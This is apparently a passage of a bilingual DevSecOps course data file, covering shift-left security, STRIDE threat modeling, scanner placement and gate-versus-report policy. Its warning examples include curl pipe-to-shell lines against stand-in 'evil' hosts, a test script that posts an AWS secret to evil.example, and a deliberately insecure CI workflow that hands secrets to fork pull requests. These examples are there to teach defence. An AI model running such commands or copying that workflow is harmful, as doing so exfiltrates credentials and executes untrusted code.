import type { CourseLesson } from './course-js-module1';

// DevOps Module 18 — DevSecOps: The Software Supply Chain & Pipeline Security (part 1 of 2). L4-6 in course-devops-module18-part2.ts.
// `# VERIFY` examples run against REAL tools, offline (trivy's vuln DB is cached in ~/.cache/trivy after the first pull):
//   syft v1.18.1    - `syft scan dir:. -o <cyclonedx-json|spdx-json|syft-table>`  (SBOM, fully offline)
//   trivy v0.74.0   - `trivy fs --scanners vuln|secret`, `trivy config`           (secret + config offline; vuln needs the cached DB)
//   cosign v2.4.1   - `cosign generate-key-pair` / `sign-blob` / `verify-blob`    (fully offline with local keys)
// L1 (shift-left / threat modeling) and L6 (poisoned pipelines / update automation) are prose + realistic output.

export const DEVOPS_MODULE_18: CourseLesson[] = [
  {
    slug: 'ops-shift-left-and-the-pipeline-attack-surface',
    title: 'Shift Left, Threat Modeling & the Pipeline as an Attack Surface',
    titleHi: 'Shift Left, Threat Modeling Aur Pipeline Ek Attack Surface Ke Roop Mein',
    description:
      'DevSecOps means moving security checks earlier — into the IDE, the pre-commit hook, and the pull request — where a fix is cheap, instead of a penetration test the week before launch. It also means recognising that the CI/CD pipeline itself is one of the highest-value targets in your infrastructure: it holds production credentials and runs arbitrary code on every push. This lesson covers shift-left, a lightweight threat-modeling method (STRIDE), the taxonomy of security scanners and where each one runs, and the difference between gating a build and merely reporting on it.',
    descriptionHi:
      'DevSecOps ka matlab security checks ko pehle move karना — IDE, pre-commit hook, aur pull request mein — jahaan ek fix sasta hai, launch se ek hafta pehle ek penetration test ke bजाय. Iska matlab ye bhi hai ki CI/CD pipeline khud aapke infrastructure mein sabse high-value targets mein se ek hai: ye production credentials rakhता hai aur har push par arbitrary code run karता hai. Ye lesson shift-left cover karता hai, ek lightweight threat-modeling method (STRIDE), security scanners ki taxonomy aur har ek kahaan run hota hai, aur ek build ko gate karने aur sirf ispar report karने ke beech ka farak.',
    difficulty: 'MEDIUM',
    duration: 22,
    order: 1,

    analogy: {
      en: '**Airport security versus searching every passenger at the gate as the plane boards.** If the only check is at the gate, a problem found there means the flight is delayed, the passenger has already spent an hour airside, and everyone is angry. Shift-left security is the layered approach a real airport uses: a check at the kerb, a check at the bag drop, a scanner before the concourse, and a spot check at the gate only as a backstop. Each layer catches things cheaply and early. And the airport also guards the thing most people forget — the baggage handling system and the catering trucks with airside passes, because whoever controls those can put anything on any plane without going through a single passenger checkpoint. Your CI/CD pipeline is the baggage system: it has a pass to production, and it will run whatever code arrives in a pull request.',
      hi: '**Airport security versus plane boarding ke waqt gate par har passenger ko search karना.** Agmar ekmatra check gate par hai, wahaan mila ek problem ka matlab flight delayed hai, passenger already ek ghanta airside spend kar chuka hai, aur sab gusse mein hain. Shift-left security wo layered approach hai jo ek real airport use karता hai: kerb par ek check, bag drop par ek check, concourse se pehle ek scanner, aur gate par ek spot check sirf ek backstop ke roop mein. Har layer cheezein sasti aur jaldi catch karती hai. Aur airport wo cheez bhi guard karता hai jo zyादातर log bhool jaते hain — baggage handling system aur airside passes wale catering trucks, kyunki jo bhi unhe control karता hai wo kisi bhi plane par kuch bhi daal sakта hai bina ek single passenger checkpoint se guzre. Aapki CI/CD pipeline baggage system hai.',
    },

    simple: `**SHIFT LEFT** — run each security check at the EARLIEST point it can run, where
the fix is cheapest:
\`\`\`
IDE / pre-commit   secret scan, lint, fast SAST, "is this dependency allowed"
                   -> feedback in seconds, before the code even exists in git
pull request / CI  SCA (dependency CVEs), full SAST, IaC scan, license check,
                   SBOM generation, image scan -> feedback in minutes, before merge
pre-deploy         image signature + provenance verification, policy check
runtime / prod     DAST, admission control, runtime detection -> last line, most expensive
\`\`\`
the cost of fixing a flaw roughly 10x's at each stage you move right. a hardcoded
secret caught by a pre-commit hook costs 30 seconds; the same secret found in a
prod breach costs a rotation, an incident, and a disclosure.

**THE PIPELINE IS A TARGET — treat it like production:**
\`\`\`
what CI has:   prod deploy credentials, signing keys, registry push rights,
               cloud admin roles, a token that can push to your default branch.
what CI does:  checks out and EXECUTES untrusted code (every PR, including from forks)
               with those credentials in the environment.
=> a malicious PR that adds  curl evil.sh | sh  to the test script, or a compromised
   build-time dependency, runs WITH your pipeline's privileges. this is the
   "poisoned pipeline" class (Lesson 6). CI is not a dev convenience; it is a
   production system with a shell open to the internet.
\`\`\`

**THREAT MODELING (lightweight) — STRIDE, one pass per system:**
\`\`\`
S  Spoofing            - can someone pretend to be a user / service / the CI?
T  Tampering           - can someone alter code / artifacts / config in flight?
R  Repudiation         - can an action happen with no audit trail?
I  Information disclosure - can secrets / PII / source leak?
D  Denial of service   - can someone exhaust it?
E  Elevation of privilege - can a low-priv actor gain high-priv access?
draw the data-flow diagram, walk each trust boundary, ask the 6 questions, write
down the mitigations you have and the ones you're missing. 1 hour, huge payoff.
\`\`\`

**SCANNER TAXONOMY — what each finds, where it runs:**
\`\`\`
SAST   static analysis of YOUR source      - injection, XSS, crypto misuse. CI, pre-commit.
SCA    software composition analysis        - CVEs in your DEPENDENCIES. CI. (Trivy, Grype, Snyk)
SECRET secret scanning                      - keys/tokens in code + git history. pre-commit + CI.
IaC    infrastructure-as-code scanning      - open security groups, public buckets. CI. (Trivy, Checkov, tfsec)
DAST   dynamic analysis of a RUNNING app    - runtime-only bugs, auth, headers. staging. (ZAP)
IMAGE  container image scanning             - OS + app CVEs, misconfig in the image. CI + registry.
LICENSE license compliance                  - GPL in a proprietary product, etc. CI.
\`\`\`

**GATE vs REPORT — decide per check, per severity:**
\`\`\`
GATE (fail the build / block the merge):  new CRITICAL/HIGH CVE with a fix available,
   any secret, a failing signature check, a public-bucket IaC finding.
REPORT (annotate the PR, track, don't block):  MEDIUM/LOW, findings with no fix yet,
   pre-existing issues (don't punish this PR for old debt - baseline them).
a gate that is too noisy gets disabled. start by REPORTING, ratchet to GATING as
you burn down the backlog. always gate NEW secrets and NEW criticals-with-a-fix.
\`\`\``,

    simpleHi: `**SHIFT LEFT** — har security check ko SABSE EARLY point par run karो jahaan ye
run kar sakता hai, jahaan fix sabse sasta hai:
\`\`\`
IDE / pre-commit   secret scan, lint, fast SAST, "kya ye dependency allowed hai"
                   -> seconds mein feedback, code ke git mein exist karने se pehle
pull request / CI  SCA (dependency CVEs), full SAST, IaC scan, license check,
                   SBOM generation, image scan -> minutes mein feedback, merge se pehle
pre-deploy         image signature + provenance verification, policy check
runtime / prod     DAST, admission control, runtime detection -> last line, sabse expensive
\`\`\`
ek flaw fix karने ki cost har stage par roughly 10x hoती hai jo aap right move karते ho.
ek pre-commit hook se pakda gaya hardcoded secret 30 seconds costs karता hai; wahi
secret ek prod breach mein mila ek rotation, ek incident, aur ek disclosure costs karता hai.

**PIPELINE EK TARGET HAI — ise production ki tarah treat karो:**
\`\`\`
CI ke paas kya hai:   prod deploy credentials, signing keys, registry push rights,
                      cloud admin roles, ek token jo aapki default branch par push kar sakta.
CI kya karता hai:     untrusted code checkout aur EXECUTE karता hai (har PR, forks se bhi)
                      un credentials ke saath environment mein.
=> ek malicious PR jo test script mein  curl evil.sh | sh  add karता hai, ya ek
   compromised build-time dependency, aapki pipeline ke privileges KE SAATH run hota hai.
   ye "poisoned pipeline" class hai (Lesson 6). CI ek dev convenience nahi hai; ye
   ek production system hai jiska ek shell internet ke liye open hai.
\`\`\`

**THREAT MODELING (lightweight) — STRIDE, per system ek pass:**
\`\`\`
S  Spoofing            - kya koi ek user / service / CI hone ka dikhava kar sakта hai?
T  Tampering           - kya koi code / artifacts / config in flight alter kar sakта hai?
R  Repudiation         - kya ek action bina ek audit trail ke ho sakта hai?
I  Information disclosure - kya secrets / PII / source leak ho sakता hai?
D  Denial of service   - kya koi ise exhaust kar sakта hai?
E  Elevation of privilege - kya ek low-priv actor high-priv access gain kar sakта hai?
data-flow diagram draw karो, har trust boundary walk karो, 6 sawaal poochो, jo
mitigations aapke paas hain aur jo missing hain wo likhो. 1 ghanta, huge payoff.
\`\`\`

**SCANNER TAXONOMY — har ek kya dhoondhता hai, kahaan run hota hai:**
\`\`\`
SAST   AAPKE source ka static analysis     - injection, XSS, crypto misuse. CI, pre-commit.
SCA    software composition analysis       - aapki DEPENDENCIES mein CVEs. CI. (Trivy, Grype, Snyk)
SECRET secret scanning                     - code + git history mein keys/tokens. pre-commit + CI.
IaC    infrastructure-as-code scanning     - open security groups, public buckets. CI. (Trivy, Checkov, tfsec)
DAST   ek RUNNING app ka dynamic analysis  - runtime-only bugs, auth, headers. staging. (ZAP)
IMAGE  container image scanning            - OS + app CVEs, image mein misconfig. CI + registry.
LICENSE license compliance                 - ek proprietary product mein GPL, etc. CI.
\`\`\`

**GATE vs REPORT — per check, per severity decide karो:**
\`\`\`
GATE (build fail / merge block):  ek fix available ke saath naya CRITICAL/HIGH CVE,
   koi bhi secret, ek failing signature check, ek public-bucket IaC finding.
REPORT (PR annotate karो, track karो, block mat karो):  MEDIUM/LOW, abhi tak koi fix
   nahi wale findings, pre-existing issues (is PR ko purане debt ke liye punish mat karो).
ek gate jo too noisy hai disable ho jaता hai. REPORTING se shuru karो, GATING tak
ratchet karो jaise aap backlog burn down karते ho. hamesha NAYE secrets aur NAYE
criticals-with-a-fix gate karो.`,

    content: `## Shift left

Security work has traditionally lived at the end of the delivery cycle — a penetration test scheduled the week before launch, a security review that is a gate nobody can pass on time. Shift-left means moving each check to the earliest point in the lifecycle where it can meaningfully run, because the cost of remediating a flaw rises by roughly an order of magnitude at each stage you move to the right. A secret caught by a pre-commit hook is a thirty-second fix that never reaches version control. The same secret discovered in a production breach is a credential rotation, an incident response, a forensic review of what was accessed, and often a regulatory disclosure. The earliest layer is the developer's own machine: fast static analysis, secret scanning, and dependency-policy checks in the IDE and the pre-commit hook, giving feedback in seconds. The next layer is the pull request and CI: software composition analysis for known vulnerabilities in dependencies, full static analysis, infrastructure-as-code scanning, license checks, SBOM generation, and container image scanning, all giving feedback in minutes and before the code merges. Then pre-deployment: verifying image signatures and build provenance, and evaluating admission-control policy. And finally runtime: dynamic testing against a running instance, and runtime threat detection — the last line of defence and the most expensive place to catch anything.

## The pipeline is an attack surface

The most under-appreciated risk in most organisations is the CI/CD system itself. Consider what it holds: production deployment credentials, artifact-signing keys, container-registry push rights, cloud administrator roles, and a token that can push to your default branch. Now consider what it does: on every push, including pull requests from forks, it checks out untrusted code and executes it — running the test suite, the build scripts, and any tooling those invoke — with those credentials present in the environment. A pull request that adds a single line like \`curl https://evil.example/x.sh | sh\` to a test script, or a build-time dependency that has been compromised upstream, runs with the full privileges of your pipeline. This is the poisoned-pipeline class of attack, covered in Lesson 6, and the mental model that prevents it is simple: CI is not a developer convenience, it is a production system that runs arbitrary code from the internet, and it must be secured to the same standard as production — least-privilege credentials, isolated runners, no secrets exposed to fork PRs, and required review before any workflow change.

## Threat modeling, lightweight

You do not need a formal methodology or a dedicated team to get most of the value of threat modeling. Take one system, draw its data-flow diagram — the components, the data stores, and the arrows between them — and mark the trust boundaries, the points where data crosses from something you control to something you do not, or from a lower privilege level to a higher one. Then walk each boundary and ask the six STRIDE questions. **Spoofing**: can an attacker impersonate a user, a service, or the CI system itself? **Tampering**: can code, an artifact, or configuration be altered in transit or at rest? **Repudiation**: can a significant action happen without an audit record? **Information disclosure**: can secrets, personal data, or source code leak? **Denial of service**: can the system be exhausted or made unavailable? **Elevation of privilege**: can a low-privilege actor obtain high-privilege access? For each applicable threat, write down the mitigation you already have and the one you are missing. An hour of this per system, done once and revisited when the architecture changes, finds design-level weaknesses that no scanner can see.

## The scanner taxonomy

Different tools find different classes of problem and run at different points. **SAST**, static application security testing, analyses your own source code for patterns like SQL injection, cross-site scripting, and cryptographic misuse; it runs in CI and often pre-commit. **SCA**, software composition analysis, inspects your dependency tree for components with known CVEs — this is where tools like Trivy, Grype, and Snyk operate, and it runs in CI. **Secret scanning** looks for keys and tokens committed to code or present in git history, and belongs both in the pre-commit hook and in CI. **IaC scanning** checks Terraform, CloudFormation, and Kubernetes manifests for insecure configurations like world-open security groups or public storage buckets; Trivy, Checkov, and tfsec do this in CI. **DAST**, dynamic application security testing, exercises a running instance of the application to find issues that only appear at runtime — missing security headers, broken authentication, injection reachable through the live API — and runs against staging. **Image scanning** examines a built container image for vulnerable OS and application packages and for misconfiguration; it runs in CI and again continuously in the registry as new CVEs are published against images you already shipped. **License scanning** flags dependency licenses incompatible with how you distribute your product.

## Gate versus report

Every check produces findings, and for each finding class and severity you must decide whether it blocks the pipeline or merely annotates it. Gate — fail the build or block the merge — for a new critical or high-severity CVE that has a fix available, for any detected secret, for a failing signature or provenance check, and for a serious IaC finding like a publicly exposed bucket. Report — annotate the pull request, record the finding, track it, but do not block — for medium and low severity, for findings with no available fix, and critically for pre-existing issues: a pull request that touches one file should not be blocked by a vulnerability that was already in the codebase, so baseline the existing findings and gate only on what is newly introduced. The reason this distinction matters is cultural: a gate that fires too often on things developers cannot immediately fix gets routed around or switched off, and then it protects nothing. The sustainable path is to start most checks in report mode, burn down the backlog they reveal, and ratchet each one to gating as the noise drops — while always, from day one, gating on newly introduced secrets and newly introduced critical vulnerabilities that have a fix.`,

    contentHi: `## Shift left

Security work traditionally delivery cycle ke end mein rehता tha — launch se ek hafta pehle scheduled ek penetration test, ek security review jo ek gate hai jise koi time par pass nahi kar sakता. Shift-left ka matlab har check ko lifecycle mein sabse early point par move karना jahaan ye meaningfully run kar sakता hai, kyunki ek flaw remediate karने ki cost har stage par roughly ek order of magnitude se badhती hai jo aap right move karते ho. Ek pre-commit hook se pakda gaya secret ek tees-second fix hai jo kabhi version control tak nahi pahunchता. Wahi secret ek production breach mein discovered ek credential rotation, ek incident response, kya access kiya gaya iska ek forensic review, aur aksar ek regulatory disclosure hai. Sabse early layer developer ki apni machine hai: IDE aur pre-commit hook mein fast static analysis, secret scanning, aur dependency-policy checks. Agli layer pull request aur CI hai. Phir pre-deployment: image signatures aur build provenance verify karना. Aur finally runtime.

## Pipeline ek attack surface hai

Zyादातर organisations mein sabse under-appreciated risk CI/CD system khud hai. Socho iske paas kya hai: production deployment credentials, artifact-signing keys, container-registry push rights, cloud administrator roles, aur ek token jo aapki default branch par push kar sakта hai. Ab socho ye kya karता hai: har push par, forks se pull requests bhi, ye untrusted code checkout aur execute karता hai un credentials ke saath environment mein present. Ek pull request jo ek single line jaise \`curl https://evil.example/x.sh | sh\` ek test script mein add karता hai, ya ek build-time dependency jo upstream compromise ho gayi hai, aapki pipeline ke full privileges ke saath run hota hai. Ye poisoned-pipeline class of attack hai, aur mental model jo ise prevent karता hai simple hai: CI ek developer convenience nahi hai, ye ek production system hai jo internet se arbitrary code run karता hai.

## Threat modeling, lightweight

Aapko threat modeling ki zyादातर value paने ke liye ek formal methodology ya ek dedicated team ki zaroorat nahi hai. Ek system lo, iska data-flow diagram draw karो, aur trust boundaries mark karो, wo points jahaan data kisi cheez se cross karता hai jo aap control karते ho kisi cheez ko jo aap nahi. Phir har boundary walk karो aur chhe STRIDE sawaal poochो. **Spoofing**: kya ek attacker ek user, ek service, ya CI system khud impersonate kar sakта hai? **Tampering**: kya code, ek artifact, ya configuration transit mein ya at rest alter ho sakता hai? **Repudiation**: kya ek significant action bina ek audit record ke ho sakता hai? **Information disclosure**: kya secrets, personal data, ya source code leak ho sakता hai? **Denial of service**: kya system exhaust ho sakता hai? **Elevation of privilege**: kya ek low-privilege actor high-privilege access obtain kar sakта hai? Har applicable threat ke liye, jo mitigation aapke paas already hai aur jo missing hai wo likhो.

## Scanner taxonomy

Alag tools alag classes ke problem dhoondhते hain aur alag points par run hote hain. **SAST** aapke apne source code ka analysis karता hai SQL injection, cross-site scripting jaise patterns ke liye; ye CI aur aksar pre-commit mein run hota hai. **SCA** aapke dependency tree ko known CVEs wale components ke liye inspect karता hai — yahaan Trivy, Grype, Snyk jaise tools operate karते hain. **Secret scanning** code ya git history mein committed keys aur tokens dhoondhता hai. **IaC scanning** Terraform, CloudFormation, aur Kubernetes manifests ko insecure configurations ke liye check karता hai. **DAST** application ka ek running instance exercise karता hai runtime par appear hone wale issues dhoondhने ke liye. **Image scanning** ek built container image ko vulnerable OS aur application packages ke liye examine karता hai. **License scanning** dependency licenses flag karता hai.

## Gate versus report

Har check findings produce karता hai, aur har finding class aur severity ke liye aapko decide karना hai ki ye pipeline block karता hai ya sirf annotate karता hai. Gate — build fail karो ya merge block karो — ek naye critical ya high-severity CVE ke liye jiska ek fix available hai, kisi bhi detected secret ke liye, ek failing signature ya provenance check ke liye. Report — pull request annotate karो, finding record karो, track karो, par block mat karो — medium aur low severity ke liye, koi available fix nahi wale findings ke liye, aur critically pre-existing issues ke liye: ek pull request jo ek file touch karता hai ek vulnerability se block nahi hona chahिए jo already codebase mein thi. Ye distinction matter karता hai kyunki ye cultural hai: ek gate jo too often fire karता hai un cheezon par jo developers immediately fix nahi kar sakते route around ho jaता hai ya switch off ho jaता hai. Sustainable path zyादातर checks ko report mode mein shuru karना hai, backlog burn down karना, aur har ek ko gating tak ratchet karना — jabki hamesha, day one se, naye introduced secrets aur naye introduced critical vulnerabilities par gating karना.`,

    examples: [
      {
        title: 'A threat model + scanner-placement pass over a deploy pipeline (worked on paper)',
        titleHi: 'Ek deploy pipeline par ek threat model + scanner-placement pass (kagaz par worked)',
        code: `# (prose worked example - a STRIDE pass + the gate/report decision for one pipeline)
# =============================================================================
# SYSTEM: "push to main -> GitHub Actions -> build image -> push to ECR -> deploy to EKS"
#
# DATA-FLOW + TRUST BOUNDARIES (| = a boundary):
#   dev laptop | GitHub repo | Actions runner | ECR | EKS cluster | prod traffic
#                            ^^^^^^^^^^^^^^^^^ runs untrusted PR code WITH an
#                                              OIDC role that can push to ECR + deploy
#
# STRIDE PASS (boundary: PR code -> Actions runner):
#   S  spoofing        a fork PR triggers a workflow that assumes the deploy role
#                      MITIGATION: pull_request from forks gets NO secrets / NO OIDC;
#                                  deploy only runs on push to main after review. [HAVE]
#   T  tampering       a PR edits .github/workflows/deploy.yml to exfiltrate the token
#                      MITIGATION: CODEOWNERS on .github/**, required review,
#                                  branch protection, "require review for workflow edits". [HAVE]
#   R  repudiation     who deployed what, when?
#                      MITIGATION: every deploy is a git SHA + an Actions run URL +
#                                  a CloudTrail entry for the role assumption. [HAVE]
#   I  info disclosure build logs print an env var containing a secret
#                      MITIGATION: secrets via the secrets store (auto-masked in logs);
#                                  no 'env | sort' in scripts; secret-scan the logs. [PARTIAL - add log scan]
#   D  denial of service a PR spawns 500 matrix jobs and drains the runner minutes
#                      MITIGATION: concurrency limits + required approval for fork PRs. [HAVE]
#   E  elevation       the ECR-push role is also allowed to modify IAM
#                      MITIGATION: scope the OIDC role to ecr:Put* + eks:deploy only,
#                                  NO iam:*, session duration 15 min. [MISSING - fix this week]
#
# SCANNER PLACEMENT + GATE/REPORT for this pipeline:
#   stage          check                    gate or report
#   pre-commit     gitleaks (secrets)       GATE (block the commit)
#   PR / CI        trivy fs (SCA, CVEs)     GATE new CRITICAL/HIGH w/ fix; REPORT the rest
#   PR / CI        trivy config (IaC)       GATE public-bucket / 0.0.0.0/0-to-22; REPORT rest
#   PR / CI        semgrep (SAST)           REPORT (until backlog burned down), GATE new HIGH
#   PR / CI        syft (SBOM)              generate + attach as an artifact (never blocks)
#   post-build     trivy image             GATE new CRITICAL w/ fix
#   pre-deploy     cosign verify           GATE (no valid signature -> no deploy)
#   registry       trivy image (rescan)    REPORT to a dashboard (new CVEs on shipped images)
#   staging        OWASP ZAP baseline      REPORT (nightly), GATE on new HIGH
# =============================================================================
echo "threat model: 4 HAVE, 1 PARTIAL (add log secret-scan), 1 MISSING (over-broad OIDC role)"`,
        output: `threat model: 4 HAVE, 1 PARTIAL (add log secret-scan), 1 MISSING (over-broad OIDC role)`,
        explain: 'This is what a lightweight threat model looks like in practice — an hour with a whiteboard, not a tool. The data-flow line names every component the code and artifacts pass through, and the trust boundary that matters most is marked: the Actions runner executes code from pull requests while holding an OIDC role that can push images and deploy. Walking the six STRIDE prompts against that one boundary surfaces six concrete concerns, and for each one the exercise records whether a mitigation is already in place, partial, or missing. Here it finds two gaps: build logs are not yet scanned for secrets that a script might print, and the deploy role is broader than it needs to be — it can touch IAM when it only needs registry-push and deploy permissions, so a compromise of the pipeline could escalate to full account control. The second half turns the scanner taxonomy into a specific placement for this pipeline, and for each check makes the gate-versus-report decision explicitly: secrets and missing signatures block unconditionally, new critical CVEs with a fix block, and everything else reports until the team has burned down the existing backlog. Nothing here required running a scanner; the value is in the structured walk.',
        explainHi: 'Ye wo hai jaise ek lightweight threat model practice mein dikhता hai — ek whiteboard ke saath ek ghanta, ek tool nahi. Data-flow line har component name karती hai jisse code aur artifacts guzarते hain, aur jo trust boundary sabse zyada matter karती hai wo marked hai: Actions runner pull requests se code execute karता hai jabki ek OIDC role hold karता hai jo images push aur deploy kar sakта hai. Us ek boundary ke against chhe STRIDE prompts walk karना chhe concrete concerns surface karता hai, aur har ek ke liye exercise record karता hai ki ek mitigation already in place hai, partial hai, ya missing hai. Yahaan ye do gaps paता hai: build logs abhi tak secrets ke liye scan nahi hote, aur deploy role zaroorat se zyada broad hai. Doosra aadha scanner taxonomy ko is pipeline ke liye ek specific placement mein badalता hai, aur har check ke liye gate-versus-report decision explicitly banाता hai.',
      },
    ],

    mistakes: [
      {
        wrong: `# security as a gate at the END: one pen test, the week before launch
  # week -1: external pen testers get access. they find:
  #   - SQL injection in 3 endpoints (a SAST tool flags this in 2 seconds/commit)
  #   - a hardcoded AWS key in the repo, committed 8 months ago (secret scan: instant)
  #   - 14 dependencies with known CRITICAL CVEs (SCA: instant, in every CI run)
  #   - an S3 bucket set to public-read in the Terraform (IaC scan: instant)
  # every one of these was introduced months ago and shippable-blocked for a WEEK
  # while devs context-switch back to old code. launch slips. and the pen test
  # budget was spent re-finding things a $0 open-source scanner finds on every push.`,
        right: `# shift each check to where the fix is cheap, keep the pen test for what only
# humans find (business-logic flaws, chained exploits, auth bypass reasoning):
  pre-commit:  gitleaks         -> a secret never reaches git
  every PR:    trivy fs         -> the CRITICAL-CVE dep is flagged on the line that adds it
               semgrep/SAST     -> the SQLi pattern is flagged in review, with the diff
               trivy config     -> the public bucket is flagged before merge
               syft             -> an SBOM is attached to every build
  pre-deploy:  cosign verify    -> only signed images deploy
  nightly:     ZAP baseline     -> runtime regressions caught in 24h, not 6 months
  quarterly:   pen test         -> now finds DESIGN flaws, not lint findings
  # each flaw is now fixed by the person who wrote it, the day they wrote it,
  # with full context - a 5-minute fix instead of a launch-blocking archaeology dig.`,
        why: 'Concentrating security into a single late gate has two compounding failure modes. First, it finds problems at the most expensive possible moment: a flaw introduced eight months ago is discovered the week before launch, when the developer who wrote it has long since moved on and must context-switch back into unfamiliar code under deadline pressure, and the fix — which would have taken minutes at the time — now blocks a release and involves re-testing everything it touches. Second, it wastes scarce expert time. A penetration test is valuable for the things only a skilled human finds: business-logic flaws, multi-step exploit chains, authentication-bypass reasoning. When the testers instead spend their engagement re-discovering hardcoded secrets, dependency CVEs, injection patterns, and public buckets — every one of which a free open-source scanner would have flagged automatically on the commit that introduced it — you have paid expert rates for work a machine does for nothing, and you still have not learned about the design-level weaknesses the pen test was supposed to reveal. The fix is to run the cheap automated checks continuously and early so each flaw is caught and fixed in context, and reserve the human pen test for the class of problem that automation genuinely cannot see.',
        whyHi: 'Security ko ek single late gate mein concentrate karना ke do compounding failure modes hain. Pehle, ye problems ko sabse expensive possible moment par dhoondhता hai: ek flaw jo aath mahine pehle introduce hua launch se ek hafta pehle discovered hota hai, jab developer jisne ise likha bahut pehle move on kar chuka hai aur deadline pressure ke tehat unfamiliar code mein wapas context-switch karना chahिए. Doosra, ye scarce expert time waste karता hai. Ek penetration test un cheezon ke liye valuable hai jo sirf ek skilled human dhoondhता hai: business-logic flaws, multi-step exploit chains. Jab testers instead apna engagement hardcoded secrets, dependency CVEs, injection patterns re-discover karने mein spend karते hain — har ek jo ek free open-source scanner automatically flag karता — aapne expert rates pay kiye hain ek machine ke kaam ke liye. Fix cheap automated checks ko continuously aur early run karना hai.',
      },
      {
        wrong: `# treating CI as a trusted sandbox: fork PRs get full secrets, workflows
# editable by anyone, one all-powerful deploy token
  on: [pull_request]                      # <-- runs on EVERY fork PR
  jobs:
    test:
      runs-on: ubuntu-latest
      env:
        AWS_ACCESS_KEY_ID:     \${{ secrets.AWS_KEY }}      # <-- exposed to fork code
        AWS_SECRET_ACCESS_KEY: \${{ secrets.AWS_SECRET }}
        NPM_TOKEN:             \${{ secrets.NPM_TOKEN }}
      steps:
        - uses: actions/checkout@v4        # checks out the attacker's PR branch
        - run: npm test                   # runs the attacker's test script + deps
  # a fork PR edits package.json's "test" script to:
  #   "test": "curl -d \\"$AWS_SECRET_ACCESS_KEY\\" https://evil.example"
  # -> your prod AWS credentials are exfiltrated by an outside contributor in one PR.`,
        right: `# CI is production. least privilege, isolate untrusted code, protect workflows.
  # 1. untrusted (fork) PRs: NO secrets, NO deploy identity.
  on:
    pull_request:            # fork PRs: lint + test + scan only, zero credentials
    push:
      branches: [main]       # deploy identity is ONLY available here, post-review
  permissions:
    contents: read           # default-deny; grant per-job what's needed
  jobs:
    deploy:
      if: github.event_name == 'push'
      permissions:
        id-token: write       # OIDC - a short-lived, tightly-scoped role. no static keys.
      environment: production # required reviewers + a deployment log
  # 2. .github/** is CODEOWNER-protected + "require review for workflow changes".
  # 3. the OIDC role: ecr:Put*, eks:deploy ONLY. no iam:*. 15-min sessions.
  # 4. pin every action to a full SHA (not @v4) so a tag can't be re-pointed.
  # 5. actions/checkout of a PR does NOT run pre-merge with elevated perms.`,
        why: 'The pipeline runs code that people outside your organisation can propose, and if that execution happens with production credentials in the environment, then anyone who can open a pull request can run arbitrary commands with those credentials. The example shows the canonical exfiltration: a fork contributor edits the test script — which the workflow dutifully executes — to send a secret to an external server, and because the workflow injected AWS and npm credentials into the environment for every pull request including forks, the attacker never needed access to anything. The correct posture treats CI as the production system it is. Untrusted pull requests, which includes every fork PR, run only the checks that need no credentials: lint, unit tests, and scanners. Any job that holds a deployment identity runs only on push to a protected branch, after review, and uses short-lived OIDC-issued credentials scoped to exactly the actions it performs rather than a static long-lived key with broad permissions. The workflow definitions themselves are protected by code owners and required review, because the ability to edit a workflow is the ability to change what runs with those credentials. And actions are pinned to immutable commit SHAs so that a supply-chain compromise of an action cannot silently change what your pipeline executes.',
        whyHi: 'Pipeline wo code run karती hai jo aapki organisation ke bahar ke log propose kar sakते hain, aur agmar wo execution production credentials ke saath environment mein hota hai, to koi bhi jo ek pull request khोल sakта hai un credentials ke saath arbitrary commands run kar sakта hai. Example canonical exfiltration dikhाता hai: ek fork contributor test script edit karता hai — jise workflow dutifully execute karता hai — ek secret ko ek external server par bhejने ke liye. Correct posture CI ko wo production system treat karता hai jo ye hai. Untrusted pull requests sirf wo checks run karते hain jinhe koi credentials nahi chahिए. Koi bhi job jo ek deployment identity hold karता hai sirf ek protected branch par push par run hota hai, review ke baad, aur short-lived OIDC-issued credentials use karता hai. Workflow definitions khud code owners aur required review dwara protected hain. Aur actions immutable commit SHAs par pinned hain.',
      },
      {
        wrong: `# turning on every scanner at max strictness on day one -> everyone disables it
  # Monday: security enables trivy + semgrep + checkov + gitleaks, ALL gating,
  #         ALL severities, on every PR, across a 6-year-old monorepo.
  # Monday PM: the first PR (a 1-line copy fix) fails with 340 findings - none of
  #         them introduced by that PR. it's all pre-existing debt.
  # Tuesday: every PR is red. reviewers learn to ignore the check.
  # Wednesday: a dev adds  continue-on-error: true  to make their PR mergeable.
  # Thursday: someone adds  # nosec  /  // nosemgrep  to 200 lines in bulk.
  # Friday: the security lead disables gating "temporarily". it never comes back.
  # net effect: worse than no scanner - now there's a green check that means nothing.`,
        right: `# baseline the backlog, gate only on NEW findings, ratchet up over weeks
  # week 1: run every scanner in REPORT mode. capture the full findings list as
  #         the BASELINE (e.g. trivy --ignorefile, semgrep --baseline-commit).
  # week 1: turn on GATING for the two things that are always unambiguous:
  #         - any NEW secret (gitleaks, gating, from day one)
  #         - any NEW CRITICAL CVE that HAS a fix available
  # weeks 2-8: each team burns down its slice of the baseline. as a category's
  #         backlog hits zero, flip that category to GATING for new findings.
  # ongoing: findings with no fix -> tracked with an expiry date, not ignored.
  #         a scanner that gates only on what THIS PR introduced stays credible,
  #         and "green" keeps meaning something.`,
        why: 'A security gate only works if people trust it, and trust collapses the first time the gate blocks a change for a reason unrelated to that change. Enabling every scanner at full strictness against a large existing codebase guarantees this on the first pull request: the developer who made a one-line fix is confronted with hundreds of pre-existing findings they did not create and cannot triage, the check is red, and the pull request is blocked for reasons that feel arbitrary and unfair. The predictable response is that people learn to ignore the red check, then actively route around it — \`continue-on-error\`, bulk suppression comments, a "temporary" disabling that becomes permanent — and the end state is a green checkmark that certifies nothing, which is worse than having no check because it creates false confidence. The sustainable approach separates the existing backlog from new work: capture all current findings as a baseline that the gate ignores, gate immediately only on the two categories that are never ambiguous — a newly added secret and a newly added critical vulnerability with a fix — and then have each team burn down its portion of the baseline, flipping each finding category to gating for new issues only once its backlog reaches zero. The gate stays credible because it only ever blocks a pull request for something that pull request actually introduced.',
